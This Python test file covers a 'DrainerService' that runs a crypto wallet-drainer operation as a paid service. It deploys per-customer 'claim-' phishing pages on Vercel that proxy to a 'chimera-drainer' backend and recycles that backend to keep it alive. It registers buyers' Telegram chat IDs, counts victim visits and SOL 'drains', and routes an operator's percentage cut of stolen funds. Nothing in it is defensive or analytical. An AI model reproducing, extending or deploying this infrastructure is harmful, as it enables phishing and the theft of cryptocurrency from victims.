# tests/test_drainer_service.py — DrainerService orchestration (mocked cloud)
from core.customer_sites import CustomerRegistry
from core.drainer_service import DrainerService

TEST_WALLET = "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
TEST_WALLET_2 = "CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR"
TEST_SECRET = "app_aaaabbbbccccdddd1111222233334444"


def make_service(tmp_path, monkeypatch):
    config = {
        "fly_api_token": "t",
        "fly_org": "org",
        "fly_region": "iad",
        "fly_app_base": "chimera-c2",
        "vercel_api_token": "t",
        "vercel_team": "team",
        "vercel_project_base": "cloudsync-front",
        "drainer": {"aes_secret": TEST_SECRET, "env": {}},
    }
    svc = DrainerService(config)
    # isolate the registry per test
    svc.registry = CustomerRegistry(tmp_path / "customers.json")
    return svc


def test_create_customer_deploys(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    captured = {}

    def fake_deploy(project_name, files):
        captured["project_name"] = project_name
        captured["files"] = files
        return {
            "project_name": project_name,
            "project_id": "pid",
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": "did",
        }

    monkeypatch.setattr(svc.vercel, "deploy_to_project", fake_deploy)

    result = svc.create_customer(TEST_WALLET, "-100999")

    assert result["url"].startswith("https://claim-")
    assert result["url"].endswith(".vercel.app")
    # the deployed files: same-origin page + vercel.json proxying to the backend
    assert 'const API_BASE_URL = "";' in captured["files"]["index.html"]
    assert "chimera-drainer.fly.dev" in captured["files"]["vercel.json"]
    assert "chimera-drainer.fly.dev" not in captured["files"]["index.html"]
    # nonce → file varies per deploy
    assert captured["files"]["index.html"].startswith("<!-- ")

    rec = svc.registry.get(TEST_WALLET)
    assert rec is not None
    assert len(rec["deployments"]) == 1


def test_create_customer_invalid_wallet(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    try:
        svc.create_customer("not-a-wallet", "-1")
        assert False, "should raise"
    except ValueError:
        pass


def test_create_customer_twice_redeploys(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    calls = []

    def fake_deploy(project_name, files):
        calls.append(project_name)
        return {
            "project_name": project_name,
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": f"did-{len(calls)}",
        }

    monkeypatch.setattr(svc.vercel, "deploy_to_project", fake_deploy)

    svc.create_customer(TEST_WALLET, "-1")
    svc.create_customer(TEST_WALLET, "-1")

    # same project both times — stable URL
    assert calls[0] == calls[1]
    # two deployments recorded
    assert len(svc.registry.get(TEST_WALLET)["deployments"]) == 2


def test_redeploy_all_skips_failures(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-1", "claim-a")
    svc.registry.add(TEST_WALLET_2, "-2", "claim-b")

    def fake_deploy(project_name, files):
        if project_name == "claim-a":
            raise RuntimeError("vercel exploded")
        return {
            "project_name": project_name,
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": "did",
        }

    monkeypatch.setattr(svc.vercel, "deploy_to_project", fake_deploy)
    results = svc.redeploy_all()

    # claim-b survived, claim-a's failure didn't kill the loop
    assert len(results) == 1
    assert results[0]["project_name"] == "claim-b"


def test_cycle_recycles_backend_and_redeploys(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-1", "claim-a")

    recycled = {}

    def fake_recycle(**kwargs):
        recycled["count"] = recycled.get("count", 0) + 1
        recycled["kwargs"] = kwargs
        return {"vm_id": "vm-new", "hostname": "chimera-drainer.fly.dev"}

    monkeypatch.setattr(svc.backend, "recycle", fake_recycle)
    monkeypatch.setattr(svc, "check_backend_health", lambda timeout=10: True)

    def fake_deploy(project_name, files):
        return {
            "project_name": project_name,
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": "did",
        }

    monkeypatch.setattr(svc.vercel, "deploy_to_project", fake_deploy)

    result = svc.cycle()

    assert recycled["count"] == 1
    assert result["backend_healthy"] is True
    assert len(result["deployed"]) == 1
    assert result["backend"]["vm_id"] == "vm-new"
    # backend recycle gets the registry's chat ids for VALID_CHAT_IDS injection
    assert recycled["kwargs"]["valid_chat_ids"] == ["-1"]


def test_create_customer_pushes_chat_id(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    pushed = {}

    def fake_push(add=None, remove=None):
        pushed["add"] = add
        pushed["remove"] = remove

    monkeypatch.setattr(svc, "_push_chat_ids", fake_push)
    monkeypatch.setattr(
        svc.vercel,
        "deploy_to_project",
        lambda project_name, files: {
            "project_name": project_name,
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": "did",
        },
    )

    svc.create_customer(TEST_WALLET, "-100999")

    # the new customer's chat id is registered on the backend immediately
    assert pushed["add"] == ["-100999"]


def test_push_chat_ids_posts_with_service_key(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.service_key = "secret-key"

    sent = {}

    def fake_post(url, headers=None, json=None, timeout=None):
        sent["url"] = url
        sent["headers"] = headers
        sent["json"] = json
        sent["timeout"] = timeout
        return type("R", (), {"status_code": 200, "text": ""})()

    monkeypatch.setattr("core.drainer_service.requests.post", fake_post)

    svc._push_chat_ids(add=["-1"], remove=["-2"])

    assert sent["url"] == "https://chimera-drainer.fly.dev/admin/chat-ids"
    assert sent["headers"] == {"X-Service-Key": "secret-key"}
    assert sent["json"] == {"add": ["-1"], "remove": ["-2"]}


def test_push_chat_ids_silent_without_key(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.service_key = ""

    def fail_post(*a, **kw):
        raise AssertionError("should not post without service key")

    monkeypatch.setattr("core.drainer_service.requests.post", fail_post)
    svc._push_chat_ids(add=["-1"])  # no crash, no post


def test_registry_chat_ids_dedupes(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-1", "claim-a")
    svc.registry.add(TEST_WALLET_2, "-1", "claim-b")
    svc.registry.add("G1haWfjDGYPExQVCT2bbYpQ83cmrN18SV8C78VHn6uio", "-2", "claim-c")

    assert svc._registry_chat_ids() == ["-1", "-2"]


# ── site management ──────────────────────────────────────────────────────────

def test_delete_customer_cleans_up(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-100999", "claim-a")

    deleted = {}
    monkeypatch.setattr(svc.vercel, "delete_project", lambda name: deleted.setdefault("p", name))
    pushed = {}
    monkeypatch.setattr(svc, "_push_chat_ids", lambda add=None, remove=None: pushed.update(add=add, remove=remove))

    result = svc.delete_customer(TEST_WALLET)

    assert result["deleted"] is True
    assert deleted["p"] == "claim-a"
    assert svc.registry.get(TEST_WALLET) is None
    # chat id unregistered — no other site uses it
    assert pushed["remove"] == ["-100999"]


def test_delete_customer_keeps_shared_chat_id(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-100999", "claim-a")
    svc.registry.add(TEST_WALLET_2, "-100999", "claim-b")

    monkeypatch.setattr(svc.vercel, "delete_project", lambda name: None)
    pushed = {}
    monkeypatch.setattr(svc, "_push_chat_ids", lambda add=None, remove=None: pushed.update(add=add, remove=remove))

    svc.delete_customer(TEST_WALLET)

    # claim-b still uses that chat id — validation stays registered
    assert pushed == {}


def test_set_usdc_payout_repatches_payload(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-100999", "claim-a")

    captured = {}

    def fake_deploy(project_name, files):
        captured["files"] = files
        return {
            "project_name": project_name,
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": "did",
        }

    monkeypatch.setattr(svc.vercel, "deploy_to_project", fake_deploy)

    svc.set_usdc_payout(TEST_WALLET, True)

    assert 'usdcPayout: true' in captured["files"]["index.html"]
    assert svc.registry.get(TEST_WALLET)["usdc_payout"] is True


def test_set_payout_wallet_keeps_project(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.registry.add(TEST_WALLET, "-100999", "claim-a")
    svc.registry.record_deployment(TEST_WALLET, "https://claim-a.vercel.app", "s" * 8)

    deployed = {}

    def fake_deploy(project_name, files):
        deployed["project"] = project_name
        deployed["files"] = files
        return {
            "project_name": project_name,
            "deployment_url": f"{project_name}.vercel.app",
            "deployment_id": "did",
        }

    monkeypatch.setattr(svc.vercel, "deploy_to_project", fake_deploy)

    result = svc.set_payout_wallet(TEST_WALLET, TEST_WALLET_2)

    # same Vercel project (stable URL), new wallet in the payload + registry
    assert deployed["project"] == "claim-a"
    assert f'targetWallet: "{TEST_WALLET_2}"' in deployed["files"]["index.html"]
    assert svc.registry.get(TEST_WALLET) is None
    assert svc.registry.get(TEST_WALLET_2)["project_name"] == "claim-a"
    assert result["url"].startswith("https://")


# ── stats accumulation ──────────────────────────────────────────────────────

def test_pull_and_accumulate_stats(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.service_key = "secret"
    # isolate the persistent stats file per test
    monkeypatch.setattr(svc, "_stats_path", lambda: tmp_path / "stats.json")
    monkeypatch.setattr(
        svc,
        "pull_stats",
        lambda: {
            "counters": {"-100999": {"visits": 5, "rejects": 1, "drains": 1}},
            "drains": [
                {"txid": "tx1", "chatId": "-100999", "solLamports": 2_000_000_000},
                {"txid": "tx2", "chatId": "-100999", "solLamports": 1_000_000_000},
            ],
        },
    )

    # pulled before recycle (cycle) — accumulate
    pulled = svc.pull_stats()
    stats = svc._accumulate_stats(pulled)
    assert stats["counters"]["-100999"]["visits"] == 5
    assert len(stats["drains"]) == 2

    # second pull: same events again → deduped by txid, counters summed
    svc.pull_stats = lambda: {
        "counters": {"-100999": {"visits": 2, "rejects": 0, "drains": 0}},
        "drains": [{"txid": "tx1", "chatId": "-100999", "solLamports": 2_000_000_000}],
    }
    stats = svc._accumulate_stats(svc.pull_stats())
    assert stats["counters"]["-100999"]["visits"] == 7
    assert len({d["txid"] for d in stats["drains"]}) == 2


def test_get_stats_filters_by_chat(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    monkeypatch.setattr(svc, "pull_stats", lambda: None)
    monkeypatch.setattr(svc, "_stats_path", lambda: tmp_path / "stats.json")
    stats = {
        "counters": {
            "-100999": {"visits": 5, "rejects": 1, "drains": 1},
            "-1": {"visits": 9, "rejects": 0, "drains": 0},
        },
        "drains": [
            {"txid": "tx1", "chatId": "-100999", "solLamports": 1},
            {"txid": "tx2", "chatId": "-1", "solLamports": 2},
        ],
    }
    monkeypatch.setattr(svc, "_load_stats", lambda: stats)

    mine = svc.get_stats("-100999")
    assert mine["counters"]["visits"] == 5
    assert [d["txid"] for d in mine["drains"]] == ["tx1"]


# ── operator fee config (admin /fee) ────────────────────────────────────────

def test_operator_config_persists_and_pushes(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    svc.service_key = "secret"
    monkeypatch.setattr(svc, "_operator_path", lambda: tmp_path / "operator.json")

    sent = {}

    def fake_post(url, headers=None, json=None, timeout=None):
        sent["url"] = url
        sent["json"] = json
        return type("R", (), {"status_code": 200, "text": ""})()

    monkeypatch.setattr("core.drainer_service.requests.post", fake_post)

    result = svc.set_operator([TEST_WALLET, TEST_WALLET_2], 0.15)

    assert result["wallets"] == [TEST_WALLET, TEST_WALLET_2]
    assert result["cut"] == 0.15
    # live-pushed to the backend admin endpoint
    assert sent["url"] == "https://chimera-drainer.fly.dev/admin/operator"
    assert sent["json"]["wallets"] == [TEST_WALLET, TEST_WALLET_2]
    assert sent["json"]["cut"] == 0.15

    # survives restart (reloaded from disk)
    assert svc.get_operator_config()["wallets"] == [TEST_WALLET, TEST_WALLET_2]


def test_operator_env_injected_on_recycle(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    monkeypatch.setattr(svc, "_operator_path", lambda: tmp_path / "operator.json")
    svc.set_operator([TEST_WALLET], 0.2)

    captured = {}

    def fake_recycle(**kwargs):
        captured["env"] = dict(svc.backend.backend_env)
        return {"vm_id": "vm-1", "hostname": "chimera-drainer.fly.dev"}

    monkeypatch.setattr(svc.backend, "recycle", fake_recycle)

    svc.ensure_backend()

    assert captured["env"]["OPERATOR_WALLETS"] == TEST_WALLET
    assert captured["env"]["OPERATOR_CUT"] == "0.2"


def test_operator_config_falls_back_to_env(tmp_path, monkeypatch):
    svc = make_service(tmp_path, monkeypatch)
    monkeypatch.setattr(svc, "_operator_path", lambda: tmp_path / "operator.json")
    # nothing persisted — falls back to config.yaml drainer.env
    svc.backend.backend_env["OPERATOR_WALLETS"] = f"{TEST_WALLET},{TEST_WALLET_2}"
    svc.backend.backend_env["OPERATOR_CUT"] = "0.1"

    cfg = svc.get_operator_config()
    assert cfg["wallets"] == [TEST_WALLET, TEST_WALLET_2]
    assert cfg["cut"] == 0.1

    # no wallets anywhere → empty config, no cut
    svc.backend.backend_env.pop("OPERATOR_WALLETS")
    cfg = svc.get_operator_config()
    assert cfg["wallets"] == []
    assert cfg["cut"] == 0.0
